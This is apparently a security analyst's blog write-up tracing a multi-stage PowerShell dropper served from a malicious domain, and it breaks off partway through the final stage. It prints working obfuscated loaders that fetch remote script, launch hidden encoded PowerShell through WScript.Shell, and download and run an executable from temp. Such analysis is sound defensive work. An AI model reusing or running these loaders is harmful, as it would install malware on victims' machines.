# Dropper Dropper Dropper

---
I recently received an alert which told me a user had connected to an information stealing website, all I had was **hxxps[:]//svs-verificationdate[.]beer** . **.beer** looks like a legitimate domain.

Due to a lack of SSL/TLS inspection, only the SNI could be seen so all I had was the domain. I had nothing else. Searching for recent scans on urlscan[.]io showed the following:

![URLScan](https://raw.githubusercontent.com/Henryisnotavailable/Henryisnotavailable.github.io/refs/heads/main/assets/images/Screenshot%202026-06-20%20122448.png)

The contents of which was:

```PowerShell
# $p4616= -join(@(45,49,49,53, 127, 106, 106, 54, 51, 54, 104, 51, 32, 55, 44, 35, 44, 38, 36, 49, 44, 42, 43, 33, 36, 49, 32, 107, 39, 32, 32, 55, 106, 114, 117, 33, 36, 117, 33, 116, 125, 33, 125, 35, 125, 32, 32, 39, 35, 122, 26, 120, 116) |%{ [char] ($_ -bxor69)}); $d925c='Downlo'+'adString'; $q4elf=New-Object ('N'+'et.WebClient'); [ScriptBlock] :: Create($q4elf. $d925c($p4616) ). Invoke ()
```

When deobfuscated (in a sandbox) it attempts to execute
```PowerShell
# Net.WebClient.DownloadString(hxxp[:]//svs-verificationdate[.]beer/70da0d18d8f8eebf?_=1)
```

When analysing this next page in a sandbox it shows:
The **ll04j** variable holds an array of ASCII codes which are converted to characters and bxored with 119, this string is then executed through **iex** (shorthand for Invoke-Expression).
```PowerShell
# <#Verification ID: d01909c7ff0eea5b#> $ll04j=-join(@(83,1,1,66,5,28,27,74,80,38,0,27,36,34,70,50,52,32,28,54,29,52,53,53,54,35,50,54,61,52,0,16,48,54,14,58,48,50,0,45,54,47,50,58,61,33,33,33,17,33,27,7,54,58,53,34,56,50,0,61,54,35,50,54,26,52,0,4,27,63,31,58,52,49,50,53,20,38,0,53,37,34,70,78,34,32,27,19,20,38,0,53,35,53,16,50,51,32,27,19,20,50,54,79,56,52,0,61,39,38,0,53,37,34,70,78,34,36,16,4,35,37,70,37,47,34,49,61,33,34,50,67,20,38,0,53,35,53,16,50,51,35,49,24,79,52,16,46,35,51,13,7,19,47,35,38,32,49,37,57,39,38,0,53,37,34,70,78,34,35,33,78,56,47,50,15,58,38,0,53,37,34,70,78,34,48,27,15,51,50,27,37,18,33,33,19,32,32,28,24,57,52,54,67,61,35,14,19,39,34,34,3,33,34,34,3,33,34,34,3,34,33,71,3,17,34,71,3,37,34,28,3,37,34,28,3,33,47,28,3,33,34,71,3,33,47,28,3,37,34,50,3,33,34,71,3,32,33,28,3,33,47,71,3,38,36,70,78,59,34,50,3,32,33,50,3,32,34,28,3,33,34,34,3,38,36,70,45,59,33,71,3,32,33,71,3,32,34,28,3,33,34,34,3,32,33,28,3,37,34,71,3,32,33,34,3,32,33,28,3,32,33,28,3,33,47,71,3,37,34,28,3,18,33,50,3,17,47,28,3,18,34,71,3,18,33,34,3,17,47,28,3,32,33,28,3,17,47,28,3,18,34,71,3,18,34,28,3,17,47,28,3,18,33,71,3,17,47,28,3,32,33,50,3,17,34,50,3,18,33,71,3,17,36,70,66,34,36,70,45,36,36,70,66,32,36,70,78,17,36,70,66,33,36,70,66,34,36,70,78,17,36,70,66,34,36,70,66,34,36,70,45,36,36,70,45,36,36,70,45,34,36,70,66,32,36,70,66,33,36,70,66,47,36,70,78,17,36,70,66,33,36,70,45,47,36,70,45,33,36,70,45,47,36,70,78,17,36,70,78,17,36,70,66,34,36,70,78,59,33,27,61,59,47,27,19,59,47,27,33,59,47,70,49,59,47,27,37,59,47,70,78,59,47,70,49,59,33,27,45,59,33,27,61,59,47,27,33,59,47,27,57,59,47,70,49,59,47,27,45,59,33,27,37,59,47,71,3,17,47,71,3,18,33,50,3,17,34,50,3,18,34,28,3,32,33,34,3,18,33,71,3,17,47,28,3,18,33,34,3,18,34,28,67,21,38,31,0,79,53,54,79,48,49,35,7,39,38,13,31,60,53,37,79,62,49,33,45,32,33,71,67,22,35,27,15,51,50,0,57,22,39,52,67,24,36,35,20,48,50,0,79,65,47,33,71,28,52,54,24,49,51,16,28,52,35,13,0,2,60,50,28,68,53,31,58,39,56,27,70,19,62,54,62,35,58,0,62,60,49,13,20,48,50,0,78,39,35,28,4,79,59,30,31,61,57,0,46,35,51,13,7,19,47,36,54,52,50,13,34,48,52,38,58,62,52,30,50,56,52,0,62,7,53,16,24,52,35,71,66,56,47,51,0,2,60,50,28,29,51,31,34,52,53,53,58,62,49,37,67,65,47,33,71,28,49,38,62,48,50,0,62,29,51,31,34,52,53,53,58,62,49,37,66,39,38,15,58,51,35,31,4,24,50,31,57,60,60,37,62,59,52,70,15,51,50,0,49,22,39,52,67,24,36,35,20,48,50,0,79,65,47,33,71,28,52,54,24,49,51,16,28,52,35,71,58,35,54,71,4,79,59,30,31,61,57,0,46,35,51,13,7,19,47,36,54,52,50,13,34,48,52,38,58,62,52,30,50,56,52,0,62,7,53,16,24,52,35,71,66,58,38,50,28,52,63,0,61,54,35,27,15,51,50,54,37,22,60,38,62,38,36,30,16,49,51,38,62,50,50,71,19,39,38,52,28,52,38,50,15,54,50,71,28,0,54,16,34,28,52,0,67,52,52,37,57,54,35,27,15,51,52,54,15,22,33,70,0,53,52,53,33,39,38,0,66,22,33,70,15,51,51,28,19,60,52,15,57,63,33,50,19,60,53,16,28,51,37,71,45,51,52,54,15,20,38,0,66,58,35,50,67,20,50,15,34,18,63,51,0,2,60,50,28,31,51,16,4,52,56,27,70,19,38,0,27,33,33,33,78,32,35,71,58,35,54,34,3,51,50,54,37,61,38,0,27,36,34,70,50,52,35,71,58,36,33,49,66,33,33,70,45,56,35,27,0,56,54,34,79,79,59,30,31,61,62,38,67,59,54,29,7,19,47,36,62,17,51,31,38,35,49,50,78,51,50,0,49,56,35,31,15,51,52,54,15,22,33,31,24,52,52,15,38,52,63,51,38,35,53,31,34,35,36,29,38,59,54,16,62,47,37,70,34,22,48,16,38,48,50,0,38,39,63,51,38,35,53,31,34,35,36,29,38,59,54,16,62,47,37,70,34,22,48,27,0,56,54,34,78,48,39,52,67,24,36,36,50,56,52,0,62,65,47,33,71,30,63,0,67,34,50,15,37,39,38,15,58,53,35,28,67,20,54,31,79,56,50,15,7,20,57,53,58,48,49,37,57,60,57,15,34,62,53,54,62,34,49,50,19,60,62,38,67,59,54,29,20,48,50,0,78,63,38,15,58,53,47,53,58,33,63,31,0,71,50,0,46,33,50,71,24,71,52,0,62,52,49,71,19,36,47,51,0,2,60,50,28,31,51,16,4,52,56,27,70,19,62,0,62,59,54,31,58,52,35,71,58,35,54,34,67,22,53,54,46,35,53,54,79,20,48,27,15,51,50,27,50,51,34,16,57,37,32,28,24,57,52,54,67,61,35,14,19,39,33,27,33,47,36,70,45,47,33,71,3,32,33,70,19,59,47,27,49,59,34,70,33,59,34,33,37,59,34,33,37,59,47,27,66,59,33,27,19,33,36,70,66,18,36,70,49,32,36,70,45,47,33,34,3,32,33,27,53,59,47,27,78,59,33,27,33,32,36,70,45,32,47,71,3,32,33,33,45,59,33,27,45,36,36,70,45,32,33,50,3,32,33,70,19,59,33,27,33,32,36,70,45,33,34,50,3,32,33,33,49,59,33,27,45,37,36,70,45,32,33,50,3,32,33,70,19,59,33,27,45,38,36,70,49,33,36,70,45,32,34,71,3,32,33,27,53,59,33,27,45,38,36,70,66,17,36,70,49,34,36,70,57,47,36,70,37,36,36,70,37,37,36,70,57,47,36,70,45,32,33,50,3,32,33,27,53,59,33,27,45,35,36,70,37,36,36,70,45,32,34,28,3,32,33,27,37,59,33,49,61,59,33,49,57,59,34,70,19,59,33,49,37,59,33,27,45,38,36,70,37,33,36,70,57,38,36,70,45,32,33,50,3,32,33,27,61,59,33,27,33,34,36,70,57,36,36,70,37,34,35,31,3,52,63,51,0,50,51,0,46,33,56,28,78,51,56,50,24,49,63,0,16,33,33,27,49,56,48,28,66,20,38,0,27,37,34,33,61,18,32,28,54,29,52,53,54,61,52,0,16,48,54,13,38,35,49,38,66,54,35,50,54,61,54,50,53,20,50,15,34,18,63,51,0,37,52,54,67,51,56,28,58,38,53,50,27,51,52,33,49,37,34,27,66,39,38,15,61,37,54,70,62,51,34,34,67,22,53,54,46,35,53,54,79,20,48,27,0,74,80,76,83,13,65,18,21,67,20,74,44,56,21,29,18,20,3,42,89,54,4,4,18,26,21,27,14,89,48,18,3,35,14,7,18,95,90,29,24,30,25,95,55,95,69,69,91,65,71,91,66,67,91,67,78,91,68,69,91,67,71,91,70,71,64,91,65,91,67,69,91,67,68,91,66,70,91,68,69,91,66,66,91,67,78,94,11,82,12,44,20,31,22,5,42,95,83,40,90,21,15,24,5,65,78,94,10,94,94,76,83,13,79,71,17,67,20,74,83,13,65,18,21,67,20,89,48,18,3,58,18,3,31,24,19,95,90,29,24,30,25,95,55,95,68,91,66,66,91,67,69,91,67,71,91,64,91,68,65,91,66,67,91,68,69,91,70,70,66,91,70,70,68,91,69,69,91,67,78,91,66,66,91,67,67,91,67,68,91,68,67,94,11,82,12,44,20,31,22,5,42,95,83,40,90,21,15,24,5,65,78,94,10,94,91,44,3,14,7,18,44,42,42,55,95,44,4,3,5,30,25,16,42,94,94,76,83,0,20,19,66,18,71,74,90,29,24,30,25,95,83,13,79,71,17,67,20,89,62,25,1,24,28,18,95,83,25,2,27,27,91,44,22,5,5,22,14,42,83,1,1,66,5,28,27,94,11,82,12,44,20,31,22,5,42,95,83,40,87,90,21,15,24,5,87,70,71,68,94,10,94,76,83,13,19,67,22,22,18,74,44,56,21,29,18,20,3,42,89,54,4,4,18,26,21,27,14,89,48,18,3,35,14,7,18,95,90,29,24,30,25,95,55,95,69,69,91,65,71,91,66,67,91,67,78,91,68,69,91,67,71,91,70,71,64,91,70,64,91,68,69,91,65,70,91,67,78,91,70,71,64,91,71,91,67,68,91,68,79,91,67,69,91,68,68,91,67,67,91,67,68,91,68,67,94,11,82,12,44,20,31,22,5,42,95,83,40,90,21,15,24,5,65,78,94,10,94,94,76,83,13,69,71,22,20,67,74,83,13,19,67,22,22,18,89,48,18,3,39,5,24,7,18,5,3,14,95,90,29,24,30,25,95,55,95,70,65,91,67,68,91,67,67,91,68,79,91,67,69,91,68,68,91,68,69,94,11,82,12,44,20,31,22,5,42,95,83,40,90,21,15,24,5,65,78,94,10,94,94,89,48,18,3,33,22,27,2,18,95,83,25,2,27,27,94,76,83,13,78,64,21,69,64,74,83,13,19,67,22,22,18,89,48,18,3,58,18,3,31,24,19,95,90,29,24,30,25,95,55,95,69,91,68,69,91,67,78,91,64,91,65,71,91,67,78,91,68,69,91,66,67,94,11,82,12,44,20,31,22,5,42,95,83,40,90,21,15,24,5,65,78,94,10,94,91,44,3,14,7,18,44,42,42,55,95,44,4,3,5,30,25,16,42,94,94,76,83,13,70,22,79,21,68,74,83,13,78,64,21,69,64,89,62,25,1,24,28,18,95,83,13,69,71,22,20,67,91,95,91,83,0,20,19,66,18,71,94,94,76,83,13,67,70,64,19,67,74,83,13,65,18,21,67,20,89,48,18,3,58,18,3,31,24,19,95,90,29,24,30,25,95,55,95,70,64,91,67,69,91,64,91,68,65,91,66,67,91,68,69,91,70,70,66,91,70,70,68,91,69,69,91,67,78,91,66,66,91,67,67,91,67,68,91,68,67,94,11,82,12,44,20,31,22,5,42,95,83,40,90,21,15,24,5,65,78,94,10,94,91,44,3,14,7,18,44,42,42,55,95,44,21,14,3,18,44,42,42,94,94,76,83,13,69,70,69,17,78,74,83,13,67,70,64,19,67,89,62,25,1,24,28,18,95,83,25,2,27,27,91,95,91,83,13,70,22,79,21,68,94,94,76,83,13,68,69,18,69,22,74,90,29,24,30,25,95,55,95,66,68,91,67,69,91,66,71,91,68,69,91,66,66,91,66,67,91,67,66,91,68,69,91,67,70,91,67,70,94,11,82,12,44,20,31,22,5,42,95,83,40,90,21,15,24,5,65,78,94,10,94,76,83,13,71,70,18,66,19,74,90,29,24,30,25,95,55,95,70,71,67,91,70,70,91,67,69,91,69,70,91,70,71,70,91,70,71,67,91,70,70,91,67,69,91,67,68,91,70,69,91,70,71,70,91,70,71,67,91,70,79,91,70,71,70,91,70,68,91,70,71,70,91,70,71,67,91,71,91,67,68,91,68,79,91,67,69,91,68,68,91,68,69,91,68,68,91,65,91,67,69,91,67,71,91,67,71,91,68,65,91,67,68,91,68,68,91,70,71,70,94,11,82,12,44,20,31,22,5,42,95,83,40,90,21,15,24,5,65,78,94,10,94,92,83,13,69,70,69,17,78,76,83,13,65,21,22,70,64,74,90,29,24,30,25,95,55,95,70,79,91,69,69,91,68,79,91,66,66,91,67,67,91,66,68,91,67,78,91,70,71,64,91,69,69,91,67,66,91,68,69,91,67,70,91,67,70,94,11,82,12,44,20,31,22,5,42,95,83,40,90,21,15,24,5,65,78,94,10,94,76,83,13,69,71,68,79,18,74,57,18,0,90,56,21,29,18,20,3,87,90,52,24,26,56,21,29,18,20,3,87,83,13,65,21,22,70,64,76,83,25,2,27,27,74,83,13,69,71,68,79,18,89,37,2,25,95,83,13,68,69,18,69,22,92,44,20,31,22,5,42,68,69,92,83,13,71,70,18,66,19,91,71,91,83,17,22,27,4,18,94,76,18,15,30,3)|%{[char]($_-bxor119)});iex($ll04j) <#Verification ID: d01909c7ff0eea5b#>
```

The value of **ll04j** is:
```PowerShell
# $vv5rkl='QwlSU1ECWkAjCBBATEAJCwgGAyMGEwZAXEMJVVVfVlpAMBUOEwJATEAmCwslHhMCFEBcQwBRU19UWldcQwBTBgEDWldcEA8OCwJPQwBRU19USgsTR1RXUFJVUE4cQwBTBgEDTFo8CgYTDzpdXTQWFRNPQwBRU19UTV9OXExMQwBRU19UGlxDElReVVdWWkoNCA4JTydPUUtVUUtVUUtUV0tfU0tRUktRUktVXktVU0tVXktRUEtVU0tWVktVX0tQS19LUEtWVEtWUktVUUtQS1ZLV0tWV0tWUktVUUtWVktRU0tWVUtWVktWVktVX0tRUkteVEtfXkteU0teVUtfXktWVktfXkteU0teUktfXkteV0tfXktWVEtfUEteV0tfS15US1ZSS15WS19fS15VS15US19fS15US15US1ZSS1ZSS1ZUS15WS15VS15XS19fS15VS1ZXS1ZVS1ZXS19fS19fS15US19LVlJLXldLXlVLX1FLXlRLX19LX1FLVlZLVlJLXlVLXlNLX1FLXlZLVlRLX0tfX0teVEtfUEteUktWVUteV0tfXkteVUteUk4bQhw8BA8GFTpPQzhKBR8IFVZWV04aTlxDEwNaPC4oSTcGEw86XV0kCAoFDgkCTzwuKEk3BhMPOl1dIAITMwIKFzcGEw9PTks8LihJNwYTDzpdXSACEzUGCQMICiEOCwIpBgoCT05OXDwuKEkjDhUCBBMIFR46XV0kFQIGEwIjDhUCBBMIFR5PQxMDThsoEhNKKRILC1xDEwFaPC4oSTcGEw86XV0kCAoFDgkCT0MTA0s8LihJNwYTDzpdXSACEzUGCQMICiEOCwIpBgoCT05MQEkCHwJATlxDEARaKQIQSigFDQIEE0dPQCkCQExAE0kwAgUkCw4CCRNATlxDCAxaV1wBCBVPQw5aV1xDDkdKCxNHVEdKBgkDR0ZDCAxcQw5MTE4cExUeHDwuKEkhDgsCOl1dQwlVVV9WT0MTAUtDEARJQwlSU1ECT0MSVF5VV1ZOTlwOAU88LihJIQ4LAjpdXSIfDhQTFE9DEwFOThxDCAxaVhoCCxQCHDQTBhUTSjQLAgIXR1UaGgQGEwQPHDQTBhUTSjQLAgIXR1UaGlwOAU9GPC4oSSEOCwI6XV0iHw4UExRPQxMBTk4cAh8OExpcNBMGFRNKNxUIBAIUFEdKIQ4LAjcGEw9HQxMBXBMVHhw0EwYVE0o0CwICF0dSXDwuKEkhDgsCOl1dIwILAhMCT0MTAU4aBAYTBA8cGlxDElEDUgNRWkoNCA4JTydPVlVXS1ZXV0tWV1dLXlFLU1VLUVRLUVRLXl5LVldVS15eS1FWS1ZXVUtWVlBLXl9LVlVWS1ZWX0tWVVZLVlZSS1ZWVEtWV1dLVlVWS1ZVUEtWVVFLVlZRS1ZWVEtWV1dLVlZQS1FVS1ZWU0tWVlBLVlZQS15fS1FUS1NXS1RSS1RRS1NXS1ZWVEtWVlBLVlZTS1RSS1ZWUktWVlRLVFJLVFNLU1dLVFRLVlZQS1RVS1NQS1ZWVEtWVlJLVlVUS1NSS1RUThtCHDwEDwYVOk9DOEoFHwgVVlFOGk5cQwlRUVJeWkAjCBAJCwgGAzQTFQ5ATEAJAEBcExUeHDwRCA4DOkMQBElDCVFRUl5PQxJRA1IDUU4aBAYTBA8cGlw=';$z6eb4c=[Object].Assembly.GetType(-join(@(22,60,54,49,32,40,107,6,42,43,51,32,55,49)|%{[char]($_-bxor69)}));$z80f4c=$z6eb4c.GetMethod(-join(@(3,55,42,40,7,36,54,32,115,113,22,49,55,44,43,34)|%{[char]($_-bxor69)}),[type[]]@([string]));$wcd5e0=-join($z80f4c.Invoke($null,[array]$vv5rkl)|%{[char]($_ -bxor 103)});$zd4aae=[Object].Assembly.GetType(-join(@(22,60,54,49,32,40,107,17,32,61,49,107,0,43,38,42,33,44,43,34)|%{[char]($_-bxor69)}));$z20ac4=$zd4aae.GetProperty(-join(@(16,43,44,38,42,33,32)|%{[char]($_-bxor69)})).GetValue($null);$z97b27=$zd4aae.GetMethod(-join(@(2,32,49,7,60,49,32,54)|%{[char]($_-bxor69)}),[type[]]@([string]));$z1a8b3=$z97b27.Invoke($z20ac4,(,$wcd5e0));$z417d4=$z6eb4c.GetMethod(-join(@(17,42,7,36,54,32,115,113,22,49,55,44,43,34)|%{[char]($_-bxor69)}),[type[]]@([byte[]]));$z212f9=$z417d4.Invoke($null,(,$z1a8b3));$z32e2a=-join(@(53,42,50,32,55,54,45,32,41,41)|%{[char]($_-bxor69)});$z01e5d=-join(@(104,11,42,21,101,104,11,42,43,12,101,104,18,101,13,101,104,0,43,38,42,33,32,33,6,42,40,40,36,43,33,101)|%{[char]($_-bxor69)})+$z212f9;$z6ba17=-join(@(18,22,38,55,44,53,49,107,22,45,32,41,41)|%{[char]($_-bxor69)});$z2038e=New-Object -ComObject $z6ba17;$null=$z2038e.Run($z32e2a+[char]32+$z01e5d,0,$false);exit
```
With nicer formatting:
```PowerShell
$vv5rkl='QwlSU1ECWkAjCBBATEAJCwgGAyMGEwZAXEMJVVVfVlpAMBUOEwJATEAmCwslHhMCFEBcQwBRU19UWldcQwBTBgEDWldcEA8OCwJPQwBRU19USgsTR1RXUFJVUE4cQwBTBgEDTFo8CgYTDzpdXTQWFRNPQwBRU19UTV9OXExMQwBRU19UGlxDElReVVdWWkoNCA4JTydPUUtVUUtVUUtUV0tfU0tRUktRUktVXktVU0tVXktRUEtVU0tWVktVX0tQS19LUEtWVEtWUktVUUtQS1ZLV0tWV0tWUktVUUtWVktRU0tWVUtWVktWVktVX0tRUkteVEtfXkteU0teVUtfXktWVktfXkteU0teUktfXkteV0tfXktWVEtfUEteV0tfS15US1ZSS15WS19fS15VS15US19fS15US15US1ZSS1ZSS1ZUS15WS15VS15XS19fS15VS1ZXS1ZVS1ZXS19fS19fS15US19LVlJLXldLXlVLX1FLXlRLX19LX1FLVlZLVlJLXlVLXlNLX1FLXlZLVlRLX0tfX0teVEtfUEteUktWVUteV0tfXkteVUteUk4bQhw8BA8GFTpPQzhKBR8IFVZWV04aTlxDEwNaPC4oSTcGEw86XV0kCAoFDgkCTzwuKEk3BhMPOl1dIAITMwIKFzcGEw9PTks8LihJNwYTDzpdXSACEzUGCQMICiEOCwIpBgoCT05OXDwuKEkjDhUCBBMIFR46XV0kFQIGEwIjDhUCBBMIFR5PQxMDThsoEhNKKRILC1xDEwFaPC4oSTcGEw86XV0kCAoFDgkCT0MTA0s8LihJNwYTDzpdXSACEzUGCQMICiEOCwIpBgoCT05MQEkCHwJATlxDEARaKQIQSigFDQIEE0dPQCkCQExAE0kwAgUkCw4CCRNATlxDCAxaV1wBCBVPQw5aV1xDDkdKCxNHVEdKBgkDR0ZDCAxcQw5MTE4cExUeHDwuKEkhDgsCOl1dQwlVVV9WT0MTAUtDEARJQwlSU1ECT0MSVF5VV1ZOTlwOAU88LihJIQ4LAjpdXSIfDhQTFE9DEwFOThxDCAxaVhoCCxQCHDQTBhUTSjQLAgIXR1UaGgQGEwQPHDQTBhUTSjQLAgIXR1UaGlwOAU9GPC4oSSEOCwI6XV0iHw4UExRPQxMBTk4cAh8OExpcNBMGFRNKNxUIBAIUFEdKIQ4LAjcGEw9HQxMBXBMVHhw0EwYVE0o0CwICF0dSXDwuKEkhDgsCOl1dIwILAhMCT0MTAU4aBAYTBA8cGlxDElEDUgNRWkoNCA4JTydPVlVXS1ZXV0tWV1dLXlFLU1VLUVRLUVRLXl5LVldVS15eS1FWS1ZXVUtWVlBLXl9LVlVWS1ZWX0tWVVZLVlZSS1ZWVEtWV1dLVlVWS1ZVUEtWVVFLVlZRS1ZWVEtWV1dLVlZQS1FVS1ZWU0tWVlBLVlZQS15fS1FUS1NXS1RSS1RRS1NXS1ZWVEtWVlBLVlZTS1RSS1ZWUktWVlRLVFJLVFNLU1dLVFRLVlZQS1RVS1NQS1ZWVEtWVlJLVlVUS1NSS1RUThtCHDwEDwYVOk9DOEoFHwgVVlFOGk5cQwlRUVJeWkAjCBAJCwgGAzQTFQ5ATEAJAEBcExUeHDwRCA4DOkMQBElDCVFRUl5PQxJRA1IDUU4aBAYTBA8cGlw=';
$z6eb4c=[Object].Assembly.GetType(-join(@(22,60,54,49,32,40,107,6,42,43,51,32,55,49)|%{[char]($_-bxor69)}));
$z80f4c=$z6eb4c.GetMethod(-join(@(3,55,42,40,7,36,54,32,115,113,22,49,55,44,43,34)|%{[char]($_-bxor69)}),[type[]]@([string]));
$wcd5e0=-join($z80f4c.Invoke($null,[array]$vv5rkl)|%{[char]($_ -bxor 103)});
$zd4aae=[Object].Assembly.GetType(-join(@(22,60,54,49,32,40,107,17,32,61,49,107,0,43,38,42,33,44,43,34)|%{[char]($_-bxor69)}));
$z20ac4=$zd4aae.GetProperty(-join(@(16,43,44,38,42,33,32)|%{[char]($_-bxor69)})).GetValue($null);
$z97b27=$zd4aae.GetMethod(-join(@(2,32,49,7,60,49,32,54)|%{[char]($_-bxor69)}),[type[]]@([string]));
$z1a8b3=$z97b27.Invoke($z20ac4,(,$wcd5e0));
$z417d4=$z6eb4c.GetMethod(-join(@(17,42,7,36,54,32,115,113,22,49,55,44,43,34)|%{[char]($_-bxor69)}),[type[]]@([byte[]]));
$z212f9=$z417d4.Invoke($null,(,$z1a8b3));
$z32e2a=-join(@(53,42,50,32,55,54,45,32,41,41)|%{[char]($_-bxor69)});
$z01e5d=-join(@(104,11,42,21,101,104,11,42,43,12,101,104,18,101,13,101,104,0,43,38,42,33,32,33,6,42,40,40,36,43,33,101)|%{[char]($_-bxor69)})+$z212f9;
$z6ba17=-join(@(18,22,38,55,44,53,49,107,22,45,32,41,41)|%{[char]($_-bxor69)});
$z2038e=New-Object -ComObject $z6ba17;
$null=$z2038e.Run($z32e2a+[char]32+$z01e5d,0,$false);exit
```
In the next step, I'll deobfuscate each line and variable declaration to make it easier to understand what's going on
```PowerShell
# $base64encodedString='QwlSU1ECWkAjCBBATEAJCwgGAyMGEwZAXEMJVVVfVlpAMBUOEwJATEAmCwslHhMCFEBcQwBRU19UWldcQwBTBgEDWldcEA8OCwJPQwBRU19USgsTR1RXUFJVUE4cQwBTBgEDTFo8CgYTDzpdXTQWFRNPQwBRU19UTV9OXExMQwBRU19UGlxDElReVVdWWkoNCA4JTydPUUtVUUtVUUtUV0tfU0tRUktRUktVXktVU0tVXktRUEtVU0tWVktVX0tQS19LUEtWVEtWUktVUUtQS1ZLV0tWV0tWUktVUUtWVktRU0tWVUtWVktWVktVX0tRUkteVEtfXkteU0teVUtfXktWVktfXkteU0teUktfXkteV0tfXktWVEtfUEteV0tfS15US1ZSS15WS19fS15VS15US19fS15US15US1ZSS1ZSS1ZUS15WS15VS15XS19fS15VS1ZXS1ZVS1ZXS19fS19fS15US19LVlJLXldLXlVLX1FLXlRLX19LX1FLVlZLVlJLXlVLXlNLX1FLXlZLVlRLX0tfX0teVEtfUEteUktWVUteV0tfXkteVUteUk4bQhw8BA8GFTpPQzhKBR8IFVZWV04aTlxDEwNaPC4oSTcGEw86XV0kCAoFDgkCTzwuKEk3BhMPOl1dIAITMwIKFzcGEw9PTks8LihJNwYTDzpdXSACEzUGCQMICiEOCwIpBgoCT05OXDwuKEkjDhUCBBMIFR46XV0kFQIGEwIjDhUCBBMIFR5PQxMDThsoEhNKKRILC1xDEwFaPC4oSTcGEw86XV0kCAoFDgkCT0MTA0s8LihJNwYTDzpdXSACEzUGCQMICiEOCwIpBgoCT05MQEkCHwJATlxDEARaKQIQSigFDQIEE0dPQCkCQExAE0kwAgUkCw4CCRNATlxDCAxaV1wBCBVPQw5aV1xDDkdKCxNHVEdKBgkDR0ZDCAxcQw5MTE4cExUeHDwuKEkhDgsCOl1dQwlVVV9WT0MTAUtDEARJQwlSU1ECT0MSVF5VV1ZOTlwOAU88LihJIQ4LAjpdXSIfDhQTFE9DEwFOThxDCAxaVhoCCxQCHDQTBhUTSjQLAgIXR1UaGgQGEwQPHDQTBhUTSjQLAgIXR1UaGlwOAU9GPC4oSSEOCwI6XV0iHw4UExRPQxMBTk4cAh8OExpcNBMGFRNKNxUIBAIUFEdKIQ4LAjcGEw9HQxMBXBMVHhw0EwYVE0o0CwICF0dSXDwuKEkhDgsCOl1dIwILAhMCT0MTAU4aBAYTBA8cGlxDElEDUgNRWkoNCA4JTydPVlVXS1ZXV0tWV1dLXlFLU1VLUVRLUVRLXl5LVldVS15eS1FWS1ZXVUtWVlBLXl9LVlVWS1ZWX0tWVVZLVlZSS1ZWVEtWV1dLVlVWS1ZVUEtWVVFLVlZRS1ZWVEtWV1dLVlZQS1FVS1ZWU0tWVlBLVlZQS15fS1FUS1NXS1RSS1RRS1NXS1ZWVEtWVlBLVlZTS1RSS1ZWUktWVlRLVFJLVFNLU1dLVFRLVlZQS1RVS1NQS1ZWVEtWVlJLVlVUS1NSS1RUThtCHDwEDwYVOk9DOEoFHwgVVlFOGk5cQwlRUVJeWkAjCBAJCwgGAzQTFQ5ATEAJAEBcExUeHDwRCA4DOkMQBElDCVFRUl5PQxJRA1IDUU4aBAYTBA8cGlw=';
$systemConvert=[Object].Assembly.GetType("System.Convert");
$base64Method=$systemConvert.GetMethod("FromBase64String",[type[]]@([string]));
$base64decodedString=-join($base64Method.Invoke($null,[array]$base64encodedString)|%{[char]($_ -bxor 103)});
$systemTextEncoding=[Object].Assembly.GetType("System.Text.Encoding");
$unicodeEncoding=$systemTextEncoding.GetProperty("Unicode").GetValue($null);
$getBytesMethod=$systemTextEncoding.GetMethod("GetBytes",[type[]]@([string]));
$b64Bytes=$getBytesMethod.Invoke($unicodeEncoding,(,$base64decodedString));
$toBase64Method=$systemConvert.GetMethod("ToBase64String",[type[]]@([byte[]]));
$b64EncodedString=$toBase64Method.Invoke($null,(,$b64Bytes));
$PShell=powershell;
$powershellCommand="-NoP -NonI -W H -EncodedCommand "+$b64EncodedString;
$wscript=WScript.Shell;
$wscriptObject=New-Object -ComObject $wscript;
$null=$wscriptObject.Run($PShell+[char]32+$powershellCommand,0,$false);exit
```
This set of commands bXORs and then decodes the value of `base64encodedString`, it then takes that value and gets the bytes, to then convert it back into base64, where it is then passed to powershell's `EncodedCommand` parameter and executed via Wscript.Shell.
The decoded command is shown below.
```PowerShell
# $n546e='Dow'+'nloadData';$n2281='Write'+'AllBytes';$g6483=0;$g4afd=0;while($g6483-lt 307527){$g4afd+=[math]::Sqrt($g6483*8);++$g6483};$u39201=-join(@(6,26,26,30,84,65,65,29,24,29,67,24,11,28,7,8,7,13,15,26,7,1,0,10,15,26,11,64,12,11,11,28,65,93,89,94,92,89,11,89,94,95,89,90,89,13,87,90,8,93,15,91,88,92,93,88,93,93,15,15,13,91,92,90,88,92,10,12,10,88,88,93,8,15,90,92,86,93,88,86,11,15,92,94,86,91,13,8,88,93,87,95,12,90,89,92,95)|%{[char]($_-bxor110)});$td=[IO.Path]::Combine([IO.Path]::GetTempPath(),[IO.Path]::GetRandomFileName());[IO.Directory]::CreateDirectory($td)|Out-Null;$tf=[IO.Path]::Combine($td,[IO.Path]::GetRandomFileName()+'.exe');$wc=New-Object ('Ne'+'t.WebClient');$ok=0;for($i=0;$i -lt 3 -and !$ok;$i++){try{[IO.File]::$n2281($tf,$wc.$n546e($u39201));if([IO.File]::Exists($tf)){$ok=1}else{Start-Sleep 2}}catch{Start-Sleep 2}};if(![IO.File]::Exists($tf)){exit};Start-Process -FilePath $tf;try{Start-Sleep 5;[IO.File]::Delete($tf)}catch{};$u6d5d6=-join(@(120,100,100,96,42,63,63,99,102,99,61,102,117,98,121,118,121,115,113,100,121,127,126,116,113,100,117,62,114,117,117,98,63,40,35,36,40,113,117,114,35,115,113,35,34,40,33,117,32,47,113,115,123,45,33)|%{[char]($_-bxor16)});$n6659='DownloadStri'+'ng';try{[void]$wc.$n6659($u6d5d6)}catch{};
```
Cleaning this up shows
```PowerShell
$n546e='Dow'+'nloadData'
$n2281='Write'+'AllBytes'
$g6483=0
$g4afd=0
while($g6483-lt 307527)
{
  $g4afd+=[math]::Sqrt($g6483*8)
  ++$g6483
}
$u39201=-join(@(6,26,26,30,84,65,65,29,24,29,67,24,11,28,7,8,7,13,15,26,7,1,0,10,15,26,11,64,12,11,11,28,65,93,89,94,92,89,11,89,94,95,89,90,89,13,87,90,8,93,15,91,88,92,93,88,93,93,15,15,13,91,92,90,88,92,10,12,10,88,88,93,8,15,90,92,86,93,88,86,11,15,92,94,86,91,13,8,88,93,87,95,12,90,89,92,95)|%{[char]($_-bxor110)})
$td=[IO.Path]::Combine([IO.Path]::GetTempPath(),[IO.Path]::GetRandomFileName())
[IO.Directory]::CreateDirectory($td)|Out-Null
$tf=[IO.Path]::Combine($td,[IO.Path]::GetRandomFileName()+'.exe')
